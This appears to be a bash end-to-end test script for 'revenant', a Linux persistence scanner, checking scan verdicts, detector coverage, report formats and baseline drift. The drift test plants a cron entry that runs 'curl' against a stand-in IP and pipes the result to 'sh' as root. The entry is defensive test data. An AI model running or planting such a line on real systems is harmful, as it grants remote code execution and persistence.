#!/usr/bin/env bash
# revenant end-to-end tests. run: bash test/e2e_local.sh
set -u
cd "$(dirname "$0")/.."
BIN="$(pwd)/bin/revenant"
WT=$(mktemp -d "${TMPDIR:-/tmp}/rvt-e2e.XXXXXX")
trap 'rm -rf "$WT"' EXIT
PASS=0; FAIL=0; T_FAIL=""
ok()  { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); T_FAIL="$T_FAIL\n  FAIL: $1"; printf '  FAIL %s\n' "$1"; }
assert() { local n="$1" cond="$2"; shift 2; if eval "$cond" >/dev/null 2>&1; then ok "$n"; else bad "$n"; fi; }

echo "[1] forge dirty + clean"
RVT_NO_COLOR=1 "$BIN" forge --out "$WT/dirty" --profile dirty >/dev/null || bad "forge dirty"
RVT_NO_COLOR=1 "$BIN" forge --out "$WT/clean" --profile clean >/dev/null || bad "forge clean"
[ -f "$WT/dirty/etc/cron.d/system-sweep" ] && ok "dirty tree staged" || bad "dirty tree staged"
[ -f "$WT/clean/etc/crontab" ] && ok "clean tree staged" || bad "clean tree staged"

echo "[2] scan verdicts"
RVT_NO_COLOR=1 "$BIN" scan --root "$WT/dirty" > "$WT/scan-dirty.txt"
[ $? -eq 10 ] && ok "dirty exit=10 (CRITICAL)" || bad "dirty exit=10"
grep -q 'verdict CRITICAL' "$WT/scan-dirty.txt" && ok "dirty verdict CRITICAL" || bad "dirty verdict"
RVT_NO_COLOR=1 "$BIN" scan --root "$WT/clean" > "$WT/scan-clean.txt"
[ $? -eq 0 ] && ok "clean exit=0 (CLEAN)" || bad "clean exit=0"
grep -q 'verdict CLEAN' "$WT/scan-clean.txt" && ok "clean verdict CLEAN" || bad "clean verdict"
! grep -qE 'RVT-' "$WT/scan-clean.txt" && ok "clean has zero findings" || bad "clean has zero findings"

echo "[3] dirty detector coverage"
for fid in RVT-CRON-001 RVT-CRON-002 RVT-SVC-002 RVT-PRX-001 RVT-USR-001 RVT-SHL-001 RVT-SHL-005 RVT-BOOT-003 RVT-UDEV-001 RVT-XDG-001 RVT-MOTD-001 RVT-SSH-003 RVT-AT-001; do
  grep -q "$fid" "$WT/scan-dirty.txt" && ok "detects $fid" || bad "detects $fid"
done

echo "[4] forge determinism"
"$BIN" forge --out "$WT/d2" --profile dirty >/dev/null
det_ok=1
( cd "$WT/dirty" && find . -type f | LC_ALL=C sort ) > "$WT/fl1"
( cd "$WT/d2" && find . -type f | LC_ALL=C sort ) > "$WT/fl2"
cmp -s "$WT/fl1" "$WT/fl2" || det_ok=0
while IFS= read -r f; do
  cmp -s "$WT/dirty/$f" "$WT/d2/$f" || { det_ok=0; break; }
done < "$WT/fl1"
( cd "$WT/dirty" && find . -type l | LC_ALL=C sort | while IFS= read -r l; do printf '%s -> %s\n' "$l" "$(readlink "$l")"; done ) > "$WT/sl1"
( cd "$WT/d2" && find . -type l | LC_ALL=C sort | while IFS= read -r l; do printf '%s -> %s\n' "$l" "$(readlink "$l")"; done ) > "$WT/sl2"
cmp -s "$WT/sl1" "$WT/sl2" || det_ok=0
[ $det_ok -eq 1 ] && ok "two forges identical (files+content+links)" || bad "forge determinism"

echo "[5] json reports"
"$BIN" scan --root "$WT/dirty" --json > "$WT/dirty.json" || true
python3 -m json.tool < "$WT/dirty.json" > /dev/null 2>&1 && ok "dirty json valid" || bad "dirty json valid"
python3 - <<PY && ok "json verdict field CRITICAL" || bad "json verdict field"
import json
d = json.load(open("$WT/dirty.json"))
assert d["verdict"] == "CRITICAL", d["verdict"]
assert d["score"] >= 100
assert any(f["id"] == "RVT-PRX-001" for f in d["findings"])
PY
"$BIN" scan --root "$WT/clean" --json | python3 -m json.tool > /dev/null 2>&1 && ok "clean json valid" || bad "clean json valid"

echo "[6] md output"
"$BIN" scan --root "$WT/dirty" --md > "$WT/dirty.md" || true
grep -q '^# revenant report' "$WT/dirty.md" && ok "md header" || bad "md header"
grep -q '| RVT-CRON-001 |' "$WT/dirty.md" && ok "md finding table" || bad "md finding table"

echo "[7] report command"
RVT_NO_COLOR=1 "$BIN" report --root "$WT/dirty" --out "$WT/out" > "$WT/report-view.txt" || true
[ -f "$WT/out/report.json" ] && [ -f "$WT/out/report.md" ] && ok "report files written" || bad "report files written"
python3 -m json.tool < "$WT/out/report.json" > /dev/null 2>&1 && ok "report.json valid" || bad "report.json valid"

echo "[8] baseline + drift"
"$BIN" baseline --save "$WT/base.txt" --root "$WT/clean" > /dev/null
"$BIN" check --base "$WT/base.txt" --root "$WT/clean" > "$WT/chk1.txt"
[ $? -eq 0 ] && ok "check no-change exit=0" || bad "check no-change exit=0"
cp -r "$WT/clean" "$WT/drifted"
printf '%s\n' '*/5 * * * * root curl -fsSL http://203.0.113.9/x.sh | sh' > "$WT/drifted/etc/cron.d/evil"
"$BIN" check --base "$WT/base.txt" --root "$WT/drifted" > "$WT/chk2.txt"
[ $? -eq 3 ] && ok "check drift crit exit=3" || bad "check drift crit exit=3"
grep -q 'added    crit RVT-CRON-001' "$WT/chk2.txt" && ok "drift names added finding" || bad "drift names added finding"

echo "[9] explain / paths / version / help"
"$BIN" explain RVT-CRON-001 > "$WT/ex.txt" && ok "explain known id" || bad "explain known id"
grep -q 'T1053.003' "$WT/ex.txt" && ok "explain cites ATT&CK" || bad "explain cites ATT&CK"
"$BIN" explain RVT-NOPE-999 > /dev/null 2>&1 && bad "unknown id rejected" || ok "unknown id rejected"
"$BIN" paths > /dev/null && ok "paths" || bad "paths"
"$BIN" version | grep -q 'revenant 0.1.0' && ok "version" || bad "version"
"$BIN" help > /dev/null && ok "help" || bad "help"

echo "[10] fail-on gates"
"$BIN" scan --root "$WT/clean" --fail-on low > /dev/null;      [ $? -eq 0 ]  && ok "clean fail-on low -> 0"       || bad "clean fail-on low"
"$BIN" scan --root "$WT/dirty" --fail-on critical > /dev/null; [ $? -eq 10 ] && ok "dirty fail-on critical -> 10" || bad "dirty fail-on critical"
"$BIN" scan --root "$WT/dirty" --fail-on low > /dev/null;      [ $? -eq 10 ] && ok "dirty fail-on low -> 10"     || bad "dirty fail-on low"

echo "[11] cli robustness"
"$BIN" scan --bogus > /dev/null 2>&1 && bad "unknown option rejected" || ok "unknown option rejected"
"$BIN" scan --root "$WT/nonexistent" > /dev/null 2>&1 && bad "bad root rejected" || ok "bad root rejected"

echo "[12] host scan (read-only)"
RVT_NO_COLOR=1 "$BIN" scan --json > "$WT/host.json"; HC=$?
case $HC in 0|1|2|3|10) ok "host scan exit=$HC (in domain)" ;; *) bad "host scan exit=$HC" ;; esac
python3 -m json.tool < "$WT/host.json" > /dev/null 2>&1 && ok "host json valid" || bad "host json valid"

echo "[13] output hygiene (no host paths in any artifact)"
if grep -rq "$HOME" "$WT" 2>/dev/null; then bad "no home paths in outputs"; else ok "no home paths in outputs"; fi

echo
echo "e2e: $PASS passed, $FAIL failed"
if [ "$FAIL" -gt 0 ]; then printf '%b\n' "$T_FAIL"; exit 1; fi
exit 0
